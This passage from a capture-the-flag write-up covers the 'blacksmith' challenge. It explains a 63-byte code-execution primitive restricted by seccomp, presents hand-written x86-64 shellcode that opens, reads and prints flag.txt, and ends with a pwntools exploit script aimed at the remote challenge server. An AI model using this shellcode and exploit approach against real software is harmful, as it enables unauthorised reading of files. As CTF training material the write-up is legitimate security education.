00100de2 ff d2        CALL      RDX                 ; RDX()</code></pre><figcaption>ASM version of <code>(*(code *)buf)();</code></figcaption></figure><p>The &#xA0;<code>(*(code *)buf)();</code> function call executes the <code>buf</code> variable on the stack as if it was assembly. This means we can inject assembly into the program. </p><h1 id="developing-amd64-x6486-assembly">Developing AMD64 (x64_86) assembly</h1><p>We have an arbitrary execution primitive so we need to write an assembly payload. The difficulty with this is that:</p><ul><li>We have <code>63</code> bytes to work with:</li></ul><figure class="kg-card kg-code-card"><pre><code class="language-c">  // shield() function
  read(STDIN_FILENO,buf,63);
  (*(code *)buf)();</code></pre><figcaption>Part of the shield() function</figcaption></figure><ul><li>We can only use <code>sys_read</code>, <code>sys_write</code>, <code>sys_open</code> and <code>sys_exit</code>:</li></ul><figure class="kg-card kg-code-card"><pre><code class="language-c">  // sec() function
  // allow sys_read, sys_write, 
  // sys_open, sys_exit
  ctx = seccomp_init(0);
  seccomp_rule_add(ctx,0x7fff0000,2,0);
  seccomp_rule_add(ctx,0x7fff0000,0,0);
  seccomp_rule_add(ctx,0x7fff0000,1,0);
  seccomp_rule_add(ctx,0x7fff0000,60,0);
  seccomp_load(ctx);</code></pre><figcaption>Part of the sec() function</figcaption></figure><ul><li>We do not have a stack address (ASLR)</li></ul><p>However, the challenge description told us that we need to read the <code>flag.txt</code> file. Hence, the strategy for this payload is opening <code>flag.txt</code>, reading <code>flag.txt</code> into a buffer, and writing the buffer to <code>stdout</code>. </p><p>To interact with those files, we need to utilize system calls (&quot;syscalls&quot;). Syscalls are essentially an ABI (binary API) with the Linux kernel which is like the god of the operating system. The kernel provides memory management, CPU scheduling, driver management, hardware IO, et cetera. If you want to learn more about the kernel, the book &quot;<a href="https://www.amazon.com/Linux-Kernel-Development-Robert-Love/dp/0672329468">Linux Kernel Development</a>&quot; by Robert Love is an excellent way to learn more about the kernel (I&apos;ve read it).</p><p>I used a <a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">Linux x64 syscall table</a> as a reference for using the syscalls. Essentially the code should do the following:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">// sys_open(char* filename, int flags, int mode)
int fd = sys_open(&quot;flag.txt&quot;, 0, 0);  

// sys_read(int fd, char* buf, size_t count)
int written = sys_read(fd, buf, 0x9999);

// sys_write(int fd, char* buf, size_t count)
sys_write(1, buf, written);</code></pre><figcaption>C pseudocode of the ASM payload</figcaption></figure><p>I came up with the following ASM:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">mov rax, 2
lea rdi, [rip+41]  ; flag.txt will be at the end of the payload
xor rsi, rsi
xor rdx, rdx
syscall

mov rsi, rdi
mov rdi, rax
xor rax, rax
mov rdx, 30
syscall

mov rdx, rax
mov rax, 1
mov rdi, rax
syscall</code></pre><figcaption>Payload used to leak flag.txt</figcaption></figure><p>Since we have only 63 bytes to work with, I had to be creative. In assembly, most bytes are allocated to constant values like <code>mov rax, 2</code> since it will store an 8-byte <code>0x00000000 00000002</code> into the instruction. That means we can <strong>save a <em>lot</em> of bytes</strong> by reusing register values. </p><p>I eventually refactored the payload into 46 bytes:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">push r10
inc r10
mov rax, r10
lea rdi, [rip+31]  ; flag.txt will be at the end of the payload
xor rsi, rsi
xor rdx, rdx
syscall

mov rsi, rdi
mov rdi, rax
xor rax, rax
mov rdx, r11
syscall

mov rdx, rax
pop rax
mov rdi, rax
syscall</code></pre><figcaption>The final compressed ASM payload</figcaption></figure><h1 id="retrieving-the-flag">Retrieving the flag</h1><p>Now we have a steady payload, we need to send it to the application. I made the following script using pwntools:</p><figure class="kg-card kg-code-card"><pre><code class="language-python">#!/usr/bin/python3

from pwn import remote, gdb, ELF, asm, context
import time

e = ELF(&apos;blacksmith&apos;)

is_remote = True
if is_remote:
    p = remote(&quot;64.227.36.64&quot;, 32615)
else:
    p = e.process()

context.binary = e.path  # set the pwntools context for asm()

p.sendlineafter(b&quot;all!\n&gt; &quot;, b&apos;1&apos;)
p.sendlineafter(b&quot;\xf0\x9f\x8f\xb9\n&gt; &quot;, b&apos;2&apos;)  # get to shield()

payload = asm(f&apos;&apos;&apos;push r10
inc r10
mov rax, r10
lea rdi, [rip+31]
xor rsi, rsi
xor rdx, rdx
syscall

mov rsi, rdi
mov rdi, rax
xor rax, rax
mov rdx, r11
syscall

mov rdx, rax
pop rax
mov rdi, rax
syscall&apos;&apos;&apos;)

print(f&quot;writing ASM with {len(payload)} bytes&quot;)

# payload = payload + filler + filename
payload += b&quot;flag.txt&quot;
print(f&quot;writing ASM+filename with {len(payload)} bytes&quot;)

p.sendafter(b&quot;weapon?\n&gt; &quot;, payload)
while True:
    print(p.recvline())
</code></pre><figcaption>The final script used for sending the payload to the application</figcaption></figure>]]></content:encoded></item></channel></rss>